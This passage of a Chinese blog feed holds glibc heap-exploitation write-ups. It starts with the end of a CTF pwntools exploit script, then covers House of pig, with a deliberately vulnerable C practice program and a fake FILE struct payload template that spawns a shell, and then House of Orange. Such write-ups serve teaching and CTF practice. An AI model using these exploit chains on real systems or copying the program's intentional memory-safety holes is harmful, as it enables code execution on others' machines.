class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./ld-linux.so.2&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/home/chen/glibc-all-in-one/libs/2.35-0ubuntu3.1_amd64/libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment">#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;gift: 0x&quot;</span>)</span><br><span class="line">libc_addr = <span class="built_in">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">success(<span class="string">&quot;libc_addr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">gets_addr = libc_addr + libc.sym[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">read_addr = libc_addr + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">io.send(p64(gets_addr))</span><br><span class="line">io.send(p64(gets_addr))</span><br><span class="line">io.send(p64(system_addr))</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *gets+201&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">io.send(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *$rebase(0x158E)&#x27;)</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;/bin0sh&#x27;</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *_IO_file_underflow+134&#x27;)</span></span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>House of pig</title>
      <link href="/2023/05/12/House-of-pig/"/>
      <url>/2023/05/12/House-of-pig/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>针对calloc函数不能申请tcachebin的一种利用链 通过伪造file结构体 调用io_str_overflow函数来获取shell</p><p>总体的伪造难度不是很大 强烈建议先只看io链的调用 不看我的解析 然后尝试自己伪造file结构体 可以很大程度提高能力</p><h1 id="调用链分析"><a href="#调用链分析" class="headerlink" title="调用链分析"></a>调用链分析</h1><p>这条链的触发形式 还是跟高版本下的链差不多 通过覆盖IO_list_all 来在堆上伪造file结构体 从而覆盖到vtable</p><p>不过本链的vtable并不需要我们伪造 原本的vtable是 IO_file_jumps指针 如果触发IO_flush_all_lockp函数 那么就会调用到IO_file_jumps对应偏移处的IO_file_overflow函数</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305121253929.png" title="image-20230512125333840" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305121253929.png" alt="image-20230512125333840"></a></p><p>与之对应的 如果我们将vtable修改为IO_str_jumps呢 那么索引到的就会是 IO_str_jumps函数</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305121255312.png" title="image-20230512125536275" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305121255312.png" alt="image-20230512125536275"></a></p><p>这个函数就是我们今天所利用的关键 ida打开2.31的libc文件 来看一下函数内部进行了什么样的操作</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305121257142.png" title="image-20230512125720119" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305121257142.png" alt="image-20230512125720119"></a></p><p>先进行了malloc 再利用memcpy往申请到的堆空间写入数据 再次调用free函数</p><p>那么这里就存在一个致命的漏洞 我们刚才说到 这条链是使用于没有malloc函数 只有calloc函数 无法调用到tcachebin中的chunk 但是我们可以通过Tcache stashing unlink attack 来把hook函数写入到tcachebin中  接着利用这里面的malloc申请出来 同时利用memcpy来覆盖hook函数 最后 如果我们覆盖的是free_hook 再伪造v4参数为&#x2F;bin&#x2F;sh 就可以触发system(“&#x2F;bin&#x2F;sh”)</p><p>那么总结一下 我们为了伪造链 并触发其 需要做到:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.覆盖IO_list_all为堆地址</span><br><span class="line">2.往tcachebin链表中写入free_hook-0x10(之所以要减去0x10 后面会提及)</span><br><span class="line">3.构造fake_file  覆盖vtable为IO_str_jumps 伪造IO_str_overflow需要的参数 触发system</span><br></pre></td></tr></table></figure><p>同时第二步需要注意 我们在Tcache stashing unlink attack中提到 要想把fake chunk放到tcachebin上 还需要满足fake chunk+0x8处为一个可写地址 所以实际上我们要利用largebin attack任意写两次</p><p>看到这里 你就可以试着自己去伪造一下file结构体了 尝试是否能够打通 下面是我自己一直在用的调试源码 可以自行编译 里面包含了大部分常见的漏洞 可以给复现很大帮助</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> chunk_time =<span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> chunk_size[<span class="number">50</span>];</span><br><span class="line"><span class="type">char</span> *chunk_ptr[<span class="number">50</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">gift</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> puts_addr = (<span class="type">size_t</span>)&amp;<span class="built_in">puts</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p&quot;</span>,(<span class="type">void</span> *)puts_addr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">menu</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Life is fucking movie&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Life is always full of unhappiness, like this question&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Anyway, what&#x27;s your answer&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> index;</span><br><span class="line">    <span class="type">char</span> size[<span class="number">20</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;What do you really want?&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(chunk_time&lt;=<span class="number">32</span>&amp;&amp;chunk_time&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!chunk_ptr[chunk_time])&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;This is the %dth choice in your life\n&quot;</span>,chunk_time);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;You can customize the size of chunk, but what about your life&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>,size,<span class="number">0x8</span>);</span><br><span class="line">        chunk_size[chunk_time] = atoi(size);</span><br><span class="line">        chunk_ptr[chunk_time] = <span class="built_in">malloc</span>(chunk_size[chunk_time]);</span><br><span class="line">        chunk_time++;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">add2</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> index;</span><br><span class="line">    <span class="type">char</span> size[<span class="number">20</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;What do you really want?&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(chunk_time&lt;=<span class="number">32</span>&amp;&amp;chunk_time&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!chunk_ptr[chunk_time])&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;This is the %dth choice in your life\n&quot;</span>,chunk_time);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;You can customize the size of chunk, but what about your life&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>,size,<span class="number">0x8</span>);</span><br><span class="line">        chunk_size[chunk_time] = atoi(size);</span><br><span class="line">        chunk_ptr[chunk_time] = <span class="built_in">calloc</span>(<span class="number">1</span>,chunk_size[chunk_time]);</span><br><span class="line">        chunk_time++;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> data[<span class="number">100</span>];</span><br><span class="line">    <span class="type">int</span> index;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;I didn&#x27;t set the pointer to zero, just like some things can&#x27;t be repeated&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;index);</span><br><span class="line">    <span class="built_in">free</span>(chunk_ptr[index]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">edit</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> index;</span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;It&#x27;s never too late to start again. What do you regret?&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;index);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You all know that there can be overflows here, so why do you set limits on your life?&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;size);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Come back!&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>,chunk_ptr[index],size);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">show</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You can&#x27;t live a perfect life without making any effort&quot;</span>);</span><br><span class="line">    <span class="type">int</span> index;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;index);</span><br><span class="line">    <span class="built_in">puts</span>(chunk_ptr[index]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> choice;</span><br><span class="line">    init();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;This program is used to debug heap vulnerabilities&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;write by chen&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        menu();</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;choice);</span><br><span class="line">        <span class="keyword">switch</span>(choice)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                add();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                delete();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                edit();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                show();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">                gift();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">                add2();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;The fog of that morning cleared, not only in the morning, but also in the fog&quot;</span>);</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;You will be stronger next time I see you&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来的详细伪造 我也会以此程序举例</p><h1 id="伪造过程分析"><a href="#伪造过程分析" class="headerlink" title="伪造过程分析"></a>伪造过程分析</h1><p>如何覆盖IO_list_all和把free_hook-0x10放到tcachebin链表上的过程这里就不过多赘述了 还需要根据题目情况来完成</p><p>直接来看如何伪造</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305121325345.png" title="image-20230512132557309" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305121325345.png" alt="image-20230512132557309"></a></p><p>如果al寄存器的二进制形式最后一位为1 就会跳转 显然这里不能让他跳转 所以要控制一下rax寄存器的值 往上朔源一下</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305121335775.png" title="image-20230512133542732" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305121335775.png" alt="image-20230512133542732"></a></p><p>可以发现和rdi寄存器有关系  而rdi寄存器经过动调发现 rdi的值是用来伪造file结构体的堆块的chunk头的prev_size域 使其最后一位不为1即可</p><p>接下来 顺利来到malloc函数  申请多大的chunk和rdi寄存器有关系 索引一下发现和r12寄存器有关系</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305121338020.png" title="image-20230512133833992" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305121338020.png" alt="image-20230512133833992"></a></p><p>r12的初始值由rbx+0x40处的地址决定 随后减去了r14的值 最后malloc申请的大小等于r12*2 + 0x64</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305121340198.png" title="image-20230512134020160" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305121340198.png" alt="image-20230512134020160"></a></p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305121343371.png" title="image-20230512134335350" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305121343371.png" alt="image-20230512134335350"></a></p><p>同时rbx的值和rdi是一样的 所以这里r14的值和r12也可以被我们赋值 那么这里r12的值就要为</p><p>*<em>malloc_size  &#x3D; (r12-r14) <em>2 + 0x68</em></em></p><p>由于free_hook-0x10放入的tcachebin链表范围很大 所以这里的size其实不用太担心 接着往下看</p><p>memcpy在gdb中的形式是这个函数 我也不知道啥原因</p><p>总之si进去看看怎么个赋值法</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305121351565.png" title="image-20230512135113532" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305121351565.png" alt="image-20230512135113532"></a></p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305121352213.png" title="image-20230512135201186" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305121352213.png" alt="image-20230512135201186"></a></p><p>由这四行汇编决定 其中vmovdqu可以操作128位的数据 也就是0x10字节 至于是采用xmm0寄存器来赋值 还是xmm1寄存器 我们来看一下决定地址的rdi寄存器,rsi寄存器,rdx寄存器</p><p>回顾一下进入memcpy函数前的三行汇编 rdi的值和rax有关系 rdx的值和r12有关系 而影响xmm寄存器的rsi和r14有关系</p><p>那我们来屡一下思路 首先 rdi+rdx-0x10 一定要能覆盖到free_hook 结合上面所说的 可以操作128位的数据 所以最后的地址为free_hook-0x8是最后的底线了</p><p>rdi的值没有办法更改 和rax挂钩 而rax是用来伪造的堆的chunk头起始地址 所以rdx为0x18是一个比较合适的值</p><p>那么还有一个rsi寄存器的值 和r14挂钩 我们之前不是说过 r12还要减去r14 然后再计算成为malloc的参数嘛 所以r14这里要想给xmm寄存器赋值system函数的真实地址(用来覆盖free_hook) 就需要r14是一个存放system地址的地址 那么这里自然是一个堆地址合适 可以供我们控制</p><p>那么r12的值就是r14+0x18  那么这里各个寄存器的值都确定下来了以后 还有一个cmp需要注意</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305121416629.png" title="image-20230512141633604" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305121416629.png" alt="image-20230512141633604"></a></p><p>rsi的值需要大于rcx才行 setz这条汇编指令把ZF标志位的值传给了cl寄存器 这里我试了下貌似都是1 所以rcx最后的值为r12-r14+1</p><p>也就是0x19 那么rsi的值只要大于这一个就可以了 而rsi的值有rbx+0x20处决定</p><p>那么还有最后一步了 就是调用free函数时的rdi寄存器</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305121420437.png" title="image-20230512142039411" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305121420437.png" alt="image-20230512142039411"></a></p><p>这个地址相当于chunk的size域 覆盖的时候替换为&#x2F;bin&#x2F;sh即可</p><p>那么到这里覆盖就结束了 下面是模板 一些地址偏移自己注意一下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = cyclic(<span class="number">0x10</span>)+ p64(<span class="number">2</span>) +<span class="string">b&#x27;/bin/sh\x00&#x27;</span>  <span class="comment">#从低地址处的一个chunk堆溢出覆盖 所以cyclic可以忽略掉 从p64(2)开始覆盖fake file的prev_size域</span></span><br><span class="line">fake_file = p64(system_addr)*<span class="number">2</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)+p64(<span class="number">0x200</span>)+p64(<span class="number">0</span>)+p64(heap_addr+<span class="number">0xb30</span>-<span class="number">0x8</span>)+p64(heap_addr+<span class="number">0xb30</span>-<span class="number">0x8</span>+<span class="number">0x18</span>)</span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xc8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file += p64(io_str_jump)</span><br><span class="line">payload += fake_file</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> heap </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>House of Orange</title>
      <link href="/2023/05/11/House-of-Orange/"/>
      <url>/2023/05/11/House-of-Orange/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一个house of链应该算是最早的伪造io file来达到攻击目的的链了</p><p>借助这个来熟悉一下file结构体 这个链本身现在已经失去价值了 只能适用于libc2.23及以前的版本</p><p>这条链可以突破没有free函数的限制 并且达到劫持程序执行流的目的</p><h1 id="File结构"><a href="#File结构" class="headerlink" title="File结构"></a>File结构</h1><p>File是linux标准IO库中用来描述文件的结构 程序的许多操作会涉及到遍历File结构体来获取对应指针</p><p>file结构的本质上是一个链表 链表头为IO_list_all 每个file结构的chain域指向下一个file结构</p><p>每个程序启动时有三个文件流是默认打开的 就是stdin stdout stderr</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305111040002.png" title="image-20230511104043909" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305111040002.png" alt="image-20230511104043909"></a></p><p>至于vtable 是一个存放许多函数指针的结构体</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305111042480.png" title="image-20230511104224447" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305111042480.png" alt="image-20230511104224447"></a></p><p>house of orange所涉及到的就是伪造上述的这两个结构体 从而劫持程序执行流</p><h1 id="链路流程分析"><a href="#链路流程分析" class="headerlink" title="链路流程分析"></a>链路流程分析</h1><p>我们知道 当plmalloc初始化堆后 如果bin中没有合适的chunk 就会从top chunk中分配所需要的chunk 那么如果所申请的chunk大于top chunk呢 分两种情况</p><p>一种是申请的chunk的size过大 需要通过mmap来分配 那么这种情况分配到的chunk就会位于libc地址上的一块空间</p><p>还有一种是top chunk过小 那么此时就会把top chunk释放进入unsortedbin 随后再次申请一个top chunk 从新的top chunk中分配所需要的chunk 不过释放top chunk还需要进行一次判断 下面来看一下源码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* There are no usable arenas and mmap also failed.  */</span></span><br><span class="line"> <span class="keyword">if</span> (av == <span class="literal">NULL</span>)</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/* Record incoming configuration of top */</span></span><br><span class="line"></span><br><span class="line"> old_top = av-&gt;top;</span><br><span class="line"> old_size = chunksize (old_top);</span><br><span class="line"> old_end = (<span class="type">char</span> *) (chunk_at_offset (old_top, old_size));</span><br><span class="line"></span><br><span class="line"> brk = snd_brk = (<span class="type">char</span> *) (MORECORE_FAILURE);</span><br><span class="line"></span><br><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If not the first time through, we require old_size to be</span></span><br><span class="line"><span class="comment">    at least MINSIZE and to have prev_inuse set.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">         ((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">          prev_inuse (old_top) &amp;&amp;</span><br><span class="line">          ((<span class="type">unsigned</span> <span class="type">long</span>) old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line"> <span class="comment">/* Precondition: not enough current space to satisfy nb request */</span></span><br><span class="line"> assert ((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE));</span><br></pre></td></tr></table></figure><p>可以看到需要进行两次的assert检查</p><p>第一次 对top chunk的大小进行检查 需要大于MINSIZE 并且Prev_inuse位要为1 top chunk的addr和size加起来还要满足刚好为一个页</p><p>我们覆盖top chunk的size 使得其不足以供我们分配 这个size要使得top chunk的结尾后3位为000</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305111102768.png" title="image-20230511110256747" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305111102768.png" alt="image-20230511110256747"></a></p><p>此时我们覆盖top chunk的size 接下来申请一个大于其size的chunk top chunk就会被释放进入unsortedbin</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305111103023.png" title="image-20230511110308999" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305111103023.png" alt="image-20230511110308999"></a></p><p>通过这种办法 可以在程序没有给予释放chunk的函数下 获得一个unsortedbin中的chunk 而在2.23及以下的版本 unsortedbin attack来任意写一个main_arena地址还是可行的 这意味着我们拥有了一次任意写的机会</p><p>我们上面说到过 file结构本质是一个链表 是通过链表头的IO_list_all的chain域来链接到下一个的file结构体</p><p>那么如果我们覆盖IO_list_all指针存放的值 接着伪造一个file结构体 把chain域覆盖成fake_file的地址 就可以实现扰乱程序索引file结构体</p><p>但是unsortedbin attack任意写的功效是有限的 只能写入main_arena+88的地址 那么根据偏移 其chain域会索引到main_arena+88+0x68处</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x0   _flags</span><br><span class="line">0x8   _IO_read_ptr</span><br><span class="line">0x10  _IO_read_end</span><br><span class="line">0x18  _IO_read_base</span><br><span class="line">0x20  _IO_write_base</span><br><span class="line">0x28  _IO_write_ptr</span><br><span class="line">0x30  _IO_write_end</span><br><span class="line">0x38  _IO_buf_base</span><br><span class="line">0x40  _IO_buf_end</span><br><span class="line">0x48  _IO_save_base</span><br><span class="line">0x50  _IO_backup_base</span><br><span class="line">0x58  _IO_save_end</span><br><span class="line">0x60  _markers</span><br><span class="line">0x68  _chain</span><br><span class="line">0x70  _fileno</span><br><span class="line">0x74  _flags2</span><br><span class="line">0x78  _old_offset</span><br><span class="line">0x80  _cur_column</span><br><span class="line">0x82  _vtable_offset</span><br><span class="line">0x83  _shortbuf</span><br><span class="line">0x88  _lock</span><br><span class="line">0x90  _offset</span><br><span class="line">0x98  _codecvt</span><br><span class="line">0xa0  _wide_data</span><br><span class="line">0xa8  _freeres_list</span><br><span class="line">0xb0  _freeres_buf</span><br><span class="line">0xb8  __pad5</span><br><span class="line">0xc0  _mode</span><br><span class="line">0xc4  _unused2</span><br><span class="line">0xd8  vtable</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305111112871.png" title="image-20230511111233849" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305111112871.png" alt="image-20230511111233849"></a></p><p>而这个偏移的地址 刚好是smallbins中 0x60的链表所位于的地址 所以我们可以释放一个0x60大小的chunk到smallbins 随后任意写覆盖io_list_all为main_arena+88 这样索引到的下一个file结构体就是smallbin chunk  伪造file结构体 就可以在这个chunk中伪造</p><p>接着是如何触发的问题 只是伪造肯定不能满足劫持执行流的目的 同时如何伪造也要根据触发的方式</p><p>这里涉及到了FSOP的知识点</p><p>其是通过IO_flush_all_lockp这个函数 这个函数会刷新io_list_all链表中的所有文件流 相当于对每个函数调用了fflush函数</p><p>而这个函数会调用到file结构体中vtable结构体中的IO_overflow函数 </p><p>如下图 我们这样伪造一个file结构体</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305111133873.png" title="image-20230511113348820" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305111133873.png" alt="image-20230511113348820"></a></p><p>其vtable也被我们所伪造 来看以下vtable</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305111134659.png" title="image-20230511113416630" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305111134659.png" alt="image-20230511113416630"></a></p><p>将其overflow函数指针伪造成system 接下来利用gdb动调进入IO_flush_all_lockp函数 看看其调用system函数时的rdi参数时什么</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305111137278.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305111137278.png"></a></p><p>可以看到rdi参数实际上是我们所伪造的file结构体的首地址 所以只要使得fake file的首地址为&#x2F;bin&#x2F;sh即可</p><p>那么如何触发IO_flush_all_lockp函数呢 一共有三种选择</p><ol><li><p>当 libc 执行 abort 流程时</p></li><li><p>当执行 exit 函数时</p></li><li><p>当执行流从 main 函数返回时</p></li></ol><p>这里使用的是第一种办法 相对来说更加通用</p><p>这个abort流程是什么呢 实际上我们破坏了堆结构 导致调用malloc_printerr函数来输出错误信息</p><p>至于具体是哪里的我没动调出来 大致的猜测是unsortedbin的bk指向的地址没有构成完整的双向链表导致的进入while循环 但是这个if分支为啥会成立就是个疑点了</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span 